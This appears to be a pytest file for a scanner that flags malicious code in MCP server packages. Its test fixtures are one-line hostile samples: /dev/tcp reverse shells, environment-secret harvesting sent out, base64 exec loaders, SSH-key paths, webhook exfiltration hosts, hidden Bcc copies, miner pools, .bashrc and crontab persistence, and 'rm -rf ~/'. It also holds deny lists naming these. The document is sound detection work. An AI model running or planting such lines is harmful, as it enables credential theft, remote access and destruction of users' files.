"""Source analysis (mcpiranha.source) and the MCP-SRC rules.

The negative cases are the shapes calibration found in real packages (calibration/README.md).
"""

import base64
import hashlib
import io
import tarfile
import zipfile
from pathlib import Path

import anyio
import pytest

from mcpiranha.core.models import Launch, Origin, ServerSnapshot, SourceHit, SourceTree
from mcpiranha.core.pipeline import scan
from mcpiranha.rules import load_rules
from mcpiranha.source import analyze_files, archive_files, collect, local_entry, verify
from mcpiranha.source import javascript as js
from mcpiranha.source import python as py

SRC_RULES = [r for r in load_rules(plugins=False) if r.id.startswith("MCP-SRC")]


def _kinds(hits: list[SourceHit]) -> set[str]:
    return {h.kind for h in hits}


@pytest.mark.parametrize(
    ("code", "kind"),
    [
        ('msg = {"To": to, "Bcc": "copy@collector.invalid"}', "hardcoded_recipient"),
        ('send(to=to, bcc="copy@collector.invalid")', "hardcoded_recipient"),
        ('headers["Cc"] = "copy@collector.invalid"', "hardcoded_recipient"),
        ('raw = "To: a@b.c\\nBcc: copy@collector.invalid\\n"', "hardcoded_recipient"),
        ("x = {k: v for k, v in os.environ.items() if 'TOKEN' in k}", "env_harvest"),
        ("x = {k: os.environ[k] for k in os.environ if 'SECRET' in k}", "env_harvest"),
        ("requests.post(u, data=json.dumps(dict(os.environ)))", "env_harvest"),
        ("exec(base64.b64decode(blob))", "dynamic_code"),
        ("eval(urllib.request.urlopen(u).read())", "dynamic_code"),
        ('KEY = Path.home() / ".ssh" / "id_rsa"', "sensitive_file"),
        ('U = "https://webhook.site/0000"', "exfil_host"),
        ('U = f"https://abc.ngrok-free.app/{x}"', "exfil_host"),
    ],
)
def test_python_detects(code: str, kind: str) -> None:
    assert kind in _kinds(py.analyze("m.py", code))


@pytest.mark.parametrize(
    "code",
    [
        "names = [k for k in os.environ if 'TOKEN' in k]",  # names only: a diagnostic
        "env = {**os.environ, 'FOO': '1'}",
        "subprocess.run(cmd, env=dict(os.environ))",
        'to = "support@example.com"',  # a recipient, but not a hidden copy
        'DESCRIPTION = "Never read ~/.ssh/id_rsa or other secrets for the user."',  # prose
        'INSTALL = "curl -LsSf https://astral.sh/uv/install.sh | sh"',  # install hint
        "exec(compile(source, path, 'exec'))",  # runs a file, nothing decoded
        "def broken(:",  # doesn't parse: no hits, no crash
    ],
)
def test_python_ignores(code: str) -> None:
    assert py.analyze("m.py", code) == []


@pytest.mark.parametrize(
    ("code", "kind"),
    [
        ("const m = { To: to, Bcc: 'phan@giftshop.club' };", "hardcoded_recipient"),
        ('mail.cc = "x@evil.example";', "hardcoded_recipient"),
        ("fetch(u, { body: JSON.stringify(process.env) });", "env_harvest"),
        ("const s = Object.entries(process.env).filter(([k]) => /TOKEN/.test(k));", "env_harvest"),
        (
            "for (const k in process.env) if (/SECRET/.test(k)) out[k] = process.env[k];",
            "env_harvest",
        ),
        ("eval(atob(payload));", "dynamic_code"),
        ("new Function(Buffer.from(x, 'base64').toString())();", "dynamic_code"),
        ("const p = path.join(os.homedir(), '.ssh', 'id_rsa');", "sensitive_file"),
        ("await fetch(`https://webhook.site/${id}`);", "exfil_host"),
        ("post('https://discord.com/api/webhooks/123456/abc');", "exfil_host"),
    ],
)
def test_javascript_detects(code: str, kind: str) -> None:
    assert kind in _kinds(js.analyze("m.js", code.encode()))


@pytest.mark.parametrize(
    "code",
    [
        "const env = { ...process.env, FOO: '1' };",
        "const names = Object.keys(process.env).filter(k => k.includes('TOKEN'));",
        "const d = 'Never read ~/.ssh/id_rsa or anything secret, this is a sentence.';",
        "const install = 'curl -fsSL https://example.com/install.sh | bash';",
        "eval(code);",  # nothing decoded or fetched in the argument
        "const t: string = 'ok'; export default t;",
    ],
)
def test_javascript_ignores(code: str) -> None:
    assert js.analyze("m.ts", code.encode()) == []


def test_minified_hits_show_nearby_code_not_the_whole_line() -> None:
    bundle = "var a=1;" * 2000 + "const m={Bcc:'x@evil.example'};" + "var b=2;" * 2000
    [hit] = js.analyze("dist/index.js", bundle.encode())
    assert "Bcc" in hit.code and len(hit.code) <= 200


def _tgz(files: dict[str, str]) -> bytes:
    buffer = io.BytesIO()
    with tarfile.open(fileobj=buffer, mode="w:gz") as tar:
        for name, text in files.items():
            data = text.encode()
            info = tarfile.TarInfo(name)
            info.size = len(data)
            tar.addfile(info, io.BytesIO(data))
    return buffer.getvalue()


def test_archives_are_read_in_memory_with_their_paths() -> None:
    data = _tgz({"package/dist/index.js": "x", "package/README.md": "no",
                 "package/node_modules/dep/i.js": "skip", "package/test/a.test.js": "skip",
                 "package/types.d.ts": "skip", "../escape.js": "outside"})  # fmt: skip
    assert [p for p, _ in archive_files(data, "pkg-1.0.0.tgz")] == ["dist/index.js",
                                                                    "escape.js"]  # fmt: skip
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w") as wheel:
        wheel.writestr("pkg/__init__.py", "x")
        wheel.writestr("pkg-1.0.dist-info/METADATA", "x")
    assert [p for p, _ in archive_files(buffer.getvalue(), "pkg-1.0-py3-none-any.whl")] == [
        "pkg/__init__.py"
    ]


def test_archive_hashes() -> None:
    data = b"archive"
    assert verify(data, "sha512-" + base64.b64encode(hashlib.sha512(data).digest()).decode())
    assert verify(data, "sha256:" + hashlib.sha256(data).hexdigest())
    assert not verify(data, "sha256:" + hashlib.sha256(b"other").hexdigest())
    assert not verify(data, "md5:whatever")


def _snapshot(command: str, *args: str, config: Path | None = None) -> ServerSnapshot:
    return ServerSnapshot(
        id="t:project:s",
        name="s",
        origin=Origin(
            kind="config", client="t", ref="s", config_path=str(config) if config else None
        ),
        launch=Launch(transport="stdio", command=command, args=list(args)),
        tools_listed=False,
    )


def test_local_scripts_are_found_and_analyzed(tmp_path: Path) -> None:
    (tmp_path / "server.py").write_text('m = {"bcc": "copy@collector.invalid"}\n')
    config = tmp_path / ".mcp.json"
    snapshot = _snapshot("python3", "server.py", config=config)
    assert local_entry(snapshot) == (tmp_path / "server.py").resolve()
    assert local_entry(_snapshot("npx", "-y", "pkg")) is None
    [out], warnings = anyio.run(lambda: collect([snapshot], download=False))
    assert warnings == [] and out.source is not None
    assert out.source.entrypoints == ["server.py"] and _kinds(out.source.hits) == {
        "hardcoded_recipient"
    }


def test_a_script_outside_a_project_is_read_alone(tmp_path: Path) -> None:
    (tmp_path / "server.py").write_text("x = 1\n")
    (tmp_path / "other.py").write_text('k = "~/.ssh/id_rsa"\n')
    [out], _ = anyio.run(lambda: collect([_snapshot("python", str(tmp_path / "server.py"))],
                                         download=False))  # fmt: skip
    assert out.source is not None and out.source.files == 1 and out.source.hits == []
    (tmp_path / "pyproject.toml").write_text("")
    [out], _ = anyio.run(lambda: collect([_snapshot("python", str(tmp_path / "server.py"))],
                                         download=False))  # fmt: skip
    assert out.source is not None and out.source.files == 2


def _found(*hits: tuple[str, str]) -> set[str]:
    tree = SourceTree(root="npm:pkg@1.0.0", language="js", files=1, hits=[
        SourceHit(kind=kind, file="index.js", line=1, code="code", detail=detail)  # type: ignore[arg-type]
        for kind, detail in hits
    ])  # fmt: skip
    snapshot = _snapshot("npx", "-y", "pkg").model_copy(update={"source": tree})
    return {f.rule_id for f in scan([snapshot], SRC_RULES).findings}


def test_rules() -> None:
    assert _found(("hardcoded_recipient", "bcc")) == {"MCP-SRC-001"}
    assert _found(("env_harvest", "x")) == {"MCP-SRC-002"}
    assert _found(("dynamic_code", "x")) == {"MCP-SRC-004"}
    assert _found(("exfil_host", "x")) == {"MCP-SRC-005"}
    # credential paths alone are common (SSH tunnels, deny-lists); with a way out, a stealer
    assert _found(("sensitive_file", "x")) == set()
    assert _found(("sensitive_file", "x"), ("exfil_host", "y")) == {"MCP-SRC-003", "MCP-SRC-005"}
    assert _found() == set()


def test_oversized_files_are_skipped() -> None:
    big = "var a = 1;\n" * (600 * 1024)  # over 5 MB
    data = _tgz({"package/dist/huge.js": big, "package/index.js": "const ok = 1;"})
    tree = analyze_files(archive_files(data, "pkg.tgz"), "npm:pkg@1.0.0")
    assert tree.files == 1 and tree.skipped == ["dist/huge.js: larger than 5 MB"]


def test_archive_bombs_stop_early(monkeypatch: pytest.MonkeyPatch) -> None:
    import mcpiranha.source as source

    monkeypatch.setattr(source, "MAX_UNPACKED", 100)
    data = _tgz({"package/a.bin": "x" * 200, "package/index.js": "const ok = 1;"})
    assert list(archive_files(data, "pkg.tgz")) == []  # gave up before reading the rest


@pytest.mark.parametrize(
    ("code", "kind"),
    [
        ("s = socket.socket(); os.dup2(s.fileno(), 0)", "reverse_shell"),
        ("subprocess.run('bash -i >& /dev/tcp/192.0.2.1/4444 0>&1', shell=True)", "reverse_shell"),
        ("POOL = 'stratum+tcp://pool.example.invalid:3333'", "miner"),
        ("open(os.path.expanduser('~/.bashrc'), 'a').write(x)", "persistence"),
        ("P = Path.home() / '.zshrc'\nP.write_text(x)", "persistence"),
        ("os.system('(crontab -l; echo job) | crontab -')", "persistence"),
        ("shutil.copy(src, Path.home() / 'Library/LaunchAgents/x.plist')", "persistence"),
        ("Path(Path.home(), '.cursor/mcp.json').write_text(cfg)", "client_config"),
        ("shutil.rmtree(Path.home())", "destructive"),
        ("os.system('rm -rf ~/')", "destructive"),
        ("exec(marshal.loads(blob))", "dynamic_code"),
        ("__pyarmor__(__name__, __file__, b'...')", "obfuscated"),
    ],
)
def test_python_detects_malware_behaviors(code: str, kind: str) -> None:
    assert kind in _kinds(py.analyze("m.py", code))


@pytest.mark.parametrize(
    "code",
    [
        "DENY = ['rm -rf /', 'bash -i >& /dev/tcp/']",  # deny-lists (calibration)
        "print(open(os.path.expanduser('~/.zshrc')).read())",  # reading a profile
        "cfg = json.loads((Path.home() / '.cursor/mcp.json').read_text())",  # reading a config
        "shutil.rmtree(build_dir)",
        "os.system('rm -rf ./dist')",
        "HELP = 'Run crontab -l to list your jobs.'",  # prose; crontab -l only lists
    ],
)
def test_python_ignores_benign_lookalikes(code: str) -> None:
    assert py.analyze("m.py", code) == []


@pytest.mark.parametrize(
    ("code", "kind"),
    [
        ("const sh = spawn('/bin/sh', []); const c = new net.Socket();", "reverse_shell"),
        ("execSync(`bash -i >& /dev/tcp/${h}/4444 0>&1`);", "reverse_shell"),
        ("spawn('./xmrig', ['--donate-level', '1']);", "miner"),
        ("fs.appendFileSync(path.join(os.homedir(), '.bashrc'), line);", "persistence"),
        ("exec(\"(crontab -l; echo '* * * * * x') | crontab -\");", "persistence"),
        (
            "const C = path.join(os.homedir(), '.cursor/mcp.json'); fs.writeFileSync(C, s);",
            "client_config",
        ),
        ("fs.rmSync(os.homedir(), { recursive: true, force: true });", "destructive"),
        ("execSync('rm -rf ~/');", "destructive"),
    ],
)
def test_javascript_detects_malware_behaviors(code: str, kind: str) -> None:
    assert kind in _kinds(js.analyze("m.js", code.encode()))


@pytest.mark.parametrize(
    "code",
    [
        "const BLOCKED = ['rm -rf /', 'bash -i >& /dev/tcp/'];",
        "const rc = fs.readFileSync(path.join(os.homedir(), '.zshrc'), 'utf8');",
        "const cfg = JSON.parse(fs.readFileSync(path.join(os.homedir(), '.cursor/mcp.json')));",
        "const p = spawn('node', ['server.js']);",
        "fs.rmSync(outDir, { recursive: true });",
        "console.error(`schtasks /Create failed (${reason})`);",  # an error message (comfyui)
    ],
)
def test_javascript_ignores_benign_lookalikes(code: str) -> None:
    assert js.analyze("m.js", code.encode()) == []


def test_obfuscator_output_is_flagged_but_minified_code_is_not() -> None:
    obfuscated = ";".join(f"var _0x{0x1A2B + i:04x}=1" for i in range(60))
    assert _kinds(js.analyze("m.js", obfuscated.encode())) == {"obfuscated"}
    minified = ";".join(f"var a{i}=1" for i in range(60))
    assert js.analyze("m.js", minified.encode()) == []


def test_client_config_writes_are_low_unless_they_auto_approve() -> None:
    plain = "fs.writeFileSync(path.join(os.homedir(), '.cursor/mcp.json'), s);"
    approving = plain + " const entry = { command: 'x', autoApprove: ['*'] };"
    for code, severity in ((plain, "low"), (approving, "high")):
        tree = analyze_files(iter([("i.js", code.encode())]), "npm:pkg@1.0.0")
        snapshot = _snapshot("npx", "-y", "pkg").model_copy(update={"source": tree})
        [finding] = scan([snapshot], SRC_RULES).findings
        assert (finding.rule_id, finding.severity.value) == ("MCP-SRC-009", severity)
